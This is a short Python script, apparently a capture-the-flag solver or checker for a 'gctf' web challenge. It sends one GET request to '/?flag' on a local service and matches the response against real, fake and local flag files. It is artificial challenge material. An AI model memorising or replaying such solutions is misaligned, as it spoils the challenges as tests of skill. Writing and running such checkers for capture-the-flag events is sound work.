#!/usr/bin/env -S python3 -u
# -*- coding: utf-8 -*-
# This exploit template was generated via:
import re
import os
import requests

# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()
def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match possible local flag
    with open("/flag.txt", "r") as local:
        locl_flag = local.readline().strip()
        if locl_flag in output:
            return locl_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None


# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)

protocol = os.environ.get("PROTOCOL", "http")
host = os.environ.get("HOST", "localhost")
port = int(os.environ.get("PORT", "1337"))

url = f"{protocol}://{host}:{port}"

print("[+] Running exploit", flush=True)

res = requests.get(f"{url}/?flag")
body = res.content.decode()
flag = find_flag(body)
if flag:
    print(f"\033[93m[+] Flag: {flag}\033[0m", flush=True)
    exit(0)

print("[+] Flag could not be found", flush=True)
exit(255)
